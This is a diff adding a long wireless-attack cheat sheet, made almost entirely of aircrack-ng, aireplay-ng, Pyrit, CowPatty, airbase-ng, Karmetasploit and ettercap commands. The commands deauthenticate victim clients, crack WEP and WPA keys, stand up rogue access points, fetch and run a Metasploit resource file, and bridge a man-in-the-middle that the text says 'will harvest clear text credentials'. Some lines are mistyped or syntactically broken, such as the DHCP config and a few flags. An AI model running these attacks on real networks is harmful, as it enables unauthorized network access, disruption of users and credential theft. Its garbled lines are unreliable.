@@ -75,3 +75,430 @@ giskismet -q "select * from wireless where wireless.essid ='SSID1' or wireless.e
 
 --Windows Clients Wireless Commands
 netsh wlan show profile "guest" key=clear
+
+#############################################Consolidated from Other Cheat Sheet############################
+--Wordlists
+darkc0de
+John the Ripper
+
+--Abbreviations
+PMK - Pairwise Master Key
+STA - Station (Client)
+PTK - Pairwise Transient Key
+GTK - Group Temporal Key
+RSN - Robust Secure Network (802.11i)
+MIC - Message Integrity Check
+TKIP - Temporal Key Integrity Protocol
+CCMP - Count Mode with CBC-MAC
+VAP - Virtual Access Point
+
+--Set Environment Variables for attacks
+--  add the ::MAC notation
+export AP_MAC=
+export ESSID=
+export VIC_STA_MAC=
+export ATK_MAC=
+
+--check on driver
+dmesg | grep 8187 #
+
+--Check Legacy Drivers
+iw list #will fail for legacy drivers, only works for 802.11 MAC Driver
+
+--swap drivers to MAC driver
+rmmod r8187  #remove the r8187
+modprobe rtl8187 # Add newer MAC Driver
+
+--swap drivers to IEEE 
+rmmod rtl8187  
+modprobe r8187
+
+--List of SSID's (IEEE)
+iw dev wlan0 scan |grep SSID
+
+--Show frequencies of available AP
+iwlist wlan0 frequency
+
+--show channel AP are on (MAC)
+iw dev wlan0 scan |egrep "DS\ Parameter\ set|SSID" 
+
+--add a mon0 vap MAC only
+iw dev wlan0 interface add mon0 type monitor
+ifconfig mon0 up
+iwconfig #check
+
+--add a moniter interface using IEEE Driver
+iwconfig wlan0 mode monitor channel 3
+ifconfig wlan0 up
+iwconfig # check
+
+--add a monitor interface using MAC driver
+iw dev wlan0 set monitor none
+
+--check monitor mode
+tcpdump -i mon0
+
+--take card out of monitor mode
+iwconfig wlan0 mode managed
+
+--delete a monitor interface using MAC driver
+iw dev mon0 interface del
+iwconfig #to check
+
+--perform an active scan (MAC)
+iw dev wlan0
+
+--perform an active scan (IEEE)
+iw dev wlan0 scan
+
+####################
+###  Airmon-ng
+####################
+
+--check configuration
+airmon-ng
+iwconfig
+
+--look for problematic processes
+airmon-ng check
+
+--kill problematic processes
+airmon-ng check kill
+
+--place interface monitor mode
+airmon-ng start wlan0
+airmon-ng start wlan0 3 # to set channel
+iwlist mon0 channel # check to confirm channel is set
+
+--stop monitor mode
+airmon-ng stop mon0
+
+
+####################
+###  Airodump
+####################
+
+--check monitor mode
+airodump-ng mon0
+airodump-ng -c 3 mon0 #only channel 3
+
+--check current mac address
+macchanger -s mon0
+
+
+airodump-ng -c 3 --bssid $AP_MAC - w [WRITE FILE] mon0  
+
+
+####################
+###  Aireplay-ng
+####################
+
+--single card injection test
+airmon-ng start wlan0
+aireplay-ng -9 mon0
+
+--two card injection test
+aireplay-ng -9 -i wlan1 mon0 # wlan1 is receiving card
+#should provide attack 1-5 and "OK" based on card/AP compatibility
+
+--Fake Authentication Attack  (Open and PSK Authentication)
+--   useful when no clients available
+airmon-ng start wlan0 3 #set to channel 3
+airodump-ng -c 3 --bssid $AP_MAC -w [OUT FILE]
+aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0
+    # -1 = fake auth attack
+    # 0 =  Re-association timing
+
+--Deauthentication Attack
+aireplay-ng -0 1 -a $AP_MAC  -c $VIC_STA_MAC mon0
+   # -0 deauth attack
+   # 1 number of attacks
+   
+-- ARP Replay attack
+--  Generate ARP traffic to repeat ARP response with new IV
+--  Madwifi requires authentication first
+aireplay-ng -3 -b $AP_MAC -h $ATK_MAC mon0 
+
+###############
+### Aircrack-ng
+###############
+--Default method is PTW crack method, only valid ARP REQ/Replay
+--  Don't use airmon-ng --IV to capture packets for this
+--FMS Coring Method
+
+
+--PTW
+aircrack-ng -0 [CAPTURE FILE]
+# -0 Color output
+
+--Dictionary Key (only method for PSK)
+-- ASC or HEX, but not both
+
+--Attacking a client to generate IV for WEP
+-- Only in range of client
+-- Restrictions on AP
+aireplay-ng -1 0 -e $ESSID -a $AP_MAC -h $ATK_MAC mon0 # Fake Authentication
+aireplay-ng -2 -b $AP_MAC -d FF:FF:FF:FF:FF:FF -f 1 -m68 -n 86 mon0
+# -2 Interactive packet replay attack
+# -d Destination Address  (FF:FF:FF:FF:FF:FF = Broadcast Address)
+# -f 1 Filter "From DS bit" set
+# -m min packet size
+# -n max packet size
+# you may have to try several attempts to get one with the STA MAC address
+
+-- PTW Attack
+aircrack-ng -0 -z -n 64 [CAPTURE FILE]
+#-0 colorful output
+#-z PTW attack
+#-n 64 #bits in WEP Key
+
+--reinject a captured packet
+aireplay-ng -2 -r [CAPTURED PACKET FILE] mon0
+# -2  #interactive replay
+# -r  replay file e.g. replay_src-0927-114055.cap
+
+--no wireless clients
+--  CHOP-CHOP or Frag
+
+--Fragmentation attack
+-- Recover PRGA stream, not key.
+airmon-ng start wlan0 3 #start on channel 3
+airodump-ng -c 3 --bssid $AP_MAC -w wepfrag mon0
+# -c Channel 3
+# -w wepfrag
+aireplay-ng -1 60 -e $ESSID -b $AP_MAC -h $ATK_MAC mon0 #Fake Auth
+# -1 Fake Auth Attack
+# 60 repeat every 60s
+
+
+aireplay-ng -5 -b $AP_MAC -h $ATK_MAC mon0 #actual Frag attack
+#Interactive
+#source MAC must be associated with AP, do a fake auth
+#Large number of packets, if any fail, entire attack fail
+#results in fragment-####-#####.xor file (PRGA file)
+
+--Note PRGA stream required (gathered above)
+packetforge-ng -0 -a $AP_MAC -h $ATK_MAC -l [Source Address] -k [Destination Address] -y [PRGA FILE(IN).xor] -w [OUT File]
+# -0 ARP packet
+# -l Source Address  Current IP Address of Attack Machine (Maybe)
+# -k Destination Address can be the broadcast e.g. 192.168.1.255
+# Out file example name injectable.cap
+tcpdump -n -vvv -e s0 -r [CAPTURE FILE ] #Check health of file.
+# -vvv extra verbosity
+
+--inject the PRGA generated ARP file into the network
+aireplay-ng -2 -r [CAPTURE FILE] mon0
+#Enter Yes.
+--End Result, The Attack machine is generating packets forcing the AP to respond
+--        These resulting responses are new IV that can be used for statistical attacks
+--        That was the Fragmentation Attack
+
+
+--ChopChop Attack
+--  Can't be used against all AP but may work where 
+
+aireplay-ng -4 -b -$AP_MAC -h %ATK_MAC mon0
+# -4 ChopChop
+#Interactive, results in decrypted packet and PRGA source stream files
+
+packetforge-ng -0 -a $AP_MAC -h $ATK_MAC -l [SOURCE IP] -k [DEST IP] -y [PRGA .xor] -w [INJECTABLE OUTPUT]
+--inject it
+aireplay-ng -2  -r [INJECTABLE OUTPUT] mon0
+
+aircrack-ng -0 [ RUNNING CAPTURE FILE]
+
+--Attacking a WEP Network with PSK
+airmon-ng start wlan0 3
+airodump-ng -c 3 --bssid $AP_MAC -w sharedkey mon0 #sniff network output to file sharedkey
+aireplay-ng -1 0 -a $AP_MAC -h $ATK_MAC mon0# Fake Auth Fails
+--must capture a PRGA sream
+aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC mon0 #deauth connected client
+--should see sharedkey...xor
+aireplay-ng -1 60 -e $ESSID -y [PRGA FIlE.xor] -a $AP_MAC -h $ATK_MAC mon0 # Fake Auth
+aireplay-ng -3 -b $AP_MAC  -h $ATK_MAC mon0 #ARP Replay
+aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC mon0 # deauth against
+aircrack-ng -0 -z -n 64 sharedkey
+
+################
+### WPA Networks
+################
+airmon-ng start wlan0 3
+airodump-ng -c 3 --bssid $AP_MAC -w [WPA OUTPUT FILE] # 4 way handshake saved here
+aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC mon0 #deauth attack 1
+#To Check the quality of the handshake
+#  Protocol EAPOL filter in wireshark
+#  Make sure teh replay counters match
+# Packets 1 and 3 must have same none value
+aircrack-ng -0 -w [path to wordlist] [Capture file]
+# -w wordlist most
+
+--import SSID to airolib
+echo $ESSID > essid.txt
+airolib-ng testdb --import essid essid.txt
+# testdb = filename
+import wordlist
+airolib-ng testdb --import passwd [path to password file]
+airolib-ng testdb --batch
+airolib-ng testdb --stats
+aircrack-ng -r testdb [WPA CaptureFILE]
+
+--Using John's mangling rules	
+airmon-ng start wlan0 3 #monitor mode on channel 3
+airodump-ng -c 3 --bssid $AP_MAC -w [OUTPUT FILE]
+aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC  mon0 #deauth
+
+#Edit John.conf, search for List.Rules:Wordlist
+# add following lines to add 2 and 3 digits.
+#$[0-9]$[0-9]
+#$[0-9]$[0-9]$[0-9]
+./john --wordlist=[WORDLISTFile] --rules --stdout |aircrack-ng -0 -e $ESSID -w - [CAPTURE FILE]
+
+--RainbowTables with CowPatty
+airmon-ng start wlan0 3 #monitor mode on channel 3 #monitor mode
+airodump-ng -c 3 --bssid $AP_MAC -w [CAPTURE FILE] mon0 #start capture
+aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC  mon0 #deauth attack
+cowpatty -r [CAPTURE FILE] -f [WORDLIST] -2 -s $ESSID  #dictionary table
+# -2 Non strict mode required for cowpatty/airodump compatability
+genpmk -f [WORD List] -d [RAINBOW FILE] -s $ESSID #Generate rainbow tables
+cowpatty -r [CAPTURE FILE] -d [PRECOMP HASH OUT FILE] -2 -s $ESSID
+
+--Pyrit Capture and Crack
+airmon-ng start wlan0 3 #monitor mode on channel 3 
+airodump-ng -c 3 --bssid $AP_MAC -w [CAPTURE FILE] mon0 #start capture
+aireplay-ng -0 1 -a $AP_MAC -c $VIC_STA_MAC mon0 #deauth attack
+pyrit -r [CAPTURE FILE] analyze  #confirm successful capture
+pyrit -r [CAPTURE FILE] -o [FILTERED CAPTURE] strip
+pyrit -r [FILTERED CAPTURE] -i [WORDLIST] -b $AP_MAC attack_passthrough #dictionary attack
+pyrit eval #check pyrit database status
+pyrit -i [WORD LIST] import_passwords
+pyrit -e $ESSID create_essid  #create a ssid for pre computational attack
+pyrit batch # compute the hash combinations using the ESSID and passwords in DB
+pyrit -r [FILTERED CAPTURE] attack_db #use the precomputed hashes
+
+--Pyrit GPU --check
+pyrit list_cores
+pyrit benchmark
+pyrit -r [FILTERED] attack_db
+
+
+
+--Airdecap-ng
+airdecap-ng -b $AP_MAC [CAPTURE FILE] #strip wireless packets
+#results in file in same dir with -dec appended
+airdecap-ng -w [WEP KEY] [CAPTURE FILE]  #decrypt WEP
+airdecap-ng -e $ESSID -p [WPA PASSWORD] [CAPTURE FILE]
+
+--airserv-ng #wireless card server
+#deploy wireless sensorsa and access remotely
+airmon-ng start wlan0 3 #monitor mode on channel 3
+airserv-ng -p [PORT] -c 3 -d mon0
+# -p set port
+# -d daemon mode
+airodump-gn-c 3 --bssid $AP_MAC [IP]:[PORT] #replaces mon0 with TCP PORT
+
+--airtun-ng
+#useful for wireless intrustion detection system
+airmon-ng start wlan0 3 #monitor mode on channel 3
+airtun-ng -a $AP_MAC -w [WEP KEY] mon0 #creates new interface AT0
+ifconfig at0 up # bring up new interface, now wireshark can receive decrypted packets
+
+--airgraph-ng
+#Clients and Access Points
+airgraph-ng -i [CSV OUTFILE] -g CAPR -o [OUT FILE].png
+#-g graph type
+#Clients Probe graph (shows AP probes, AP may not be in area)
+airgraph-ng -i [CSV OUTFILE] -g CPG -o [OUT FILE].png
+
+--kismet
+#.nettxt captures lots o useful info
+--giskismet
+gpsd -n -N -D4 /dev/ttyUSB0
+# -n don't wait for clients
+# -N keep in foreground
+# results in .netxml with GPS and wireless network
+giskismet -x [.netxml]
+giskismet -q "select * from wireless" -o [OUTFILE].kml
+# -q Query
+#then open KML file with google earth
+
+--Airbase-ng, Rogue Wireless 
+airmon-ng start wlan0 3 #monitor mode on channel 3
+airbase-ng -c 3 -e "[ESSID]" mon0 #basic instance (test)
+airodump -c 3 -d $ATK_MAC -w [writefile]
+# -d filters other interfaces
+airbase-ng -c 3 -e $ESSID -z 4 -W 1 mon0
+# -z 4 WPA2 CCMP
+# -W -specify WEP encryption
+aircrack-ng -w [WORD LIST] [CAPTURE FILE]
+
+
+--karmetasploit
+#requires dhcp server # some installation errors are expected
+#   apt-get install dhcp3-server
+airmon-ng start wlan0 3 #monitor mode on channel 3
+
+airbase-ng -c 3 -P -C 60 -e $ESSID -v mon0
+# -P respond to all probe requests regardless of ESSID
+# -C rerbroadcast ESSID
+# -v verbose output
+# results in new interface (e.g. at0)
+ifconfig at0 up [IP]/24
+mkdir -p /var/run/dhcpd #create dhcp pid file
+chown -R dhcpd:dhcpd: /var/run/dhcpd
+touch /var/lib/dhcp3/dhcpd.leases
+#Edit /tmp/dhcpd.conf
+default-lease-time 60;
+max-lease-time 72;
+ddns-update-style none;
+authoritative;
+log-facility local7;
+subnet 10.0.0.0 netmask 255.255.255.0 {
+rante 10.0.0.100 10.0.0.254;
+option routers 10.9,0.0.1-5
+option domain-name-servers 10.0.0.1;}
+#END Edit
+touch /tmp/dhcp.log
+chown dhcpd:dhcpd /tmp/dhcp.log
+dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcpd.log at0
+# -f server as a process
+# -cf config file
+# -pf pif file
+# -lf log file
+
+#download karmetasploit resource file
+wget http://metasploit.com/users/hdm/tools/karma.rc
+# comment out first to lines about sqlite
+msfconsole -r karam.rc
+
+
+--MITM
+airmon-ng start wlan0 3 #monitor mode on channel 3
+airbase-ng -c 3 -e $ESSID mon0
+brctl add br [BRIDGE NAME]#add a bridge interface
+brctl addif [BRIDGE NAME] etho
+brctl addif [BRIDGE NAME] at0 # at0 was created by airbase-ng
+ifconfig eth0 0.0.0.0 up
+ifconfig at0 0.0.0.0 up
+ifconfig [BRIDGE NAME] [NETWORK IP] up
+echo 1 > /proc/sys/net/ipv4/ip_forward # setup IP forwarding
+#the bridge will relay DHCP to the client from the eth0 network
+driftnet # view images moving across wireless
+ettercap -G
+# -G GTK interface
+# Sniff > Unified sniffing > [bridge interface]> start sniffing
+# this will harvest clear text credentials
+
+
+
+################
+###
+###  VMWAre Fix
+###
+################
+-- The following commands provide a fix for VMWare Realtek 8187 compatibility issue with shutdowns.
+rmmod rtl8187
+rfkill block all
+rfkill unblock all
+modprobe rtl8187
+rfkill unblock all
+ifconfig wlan0 up
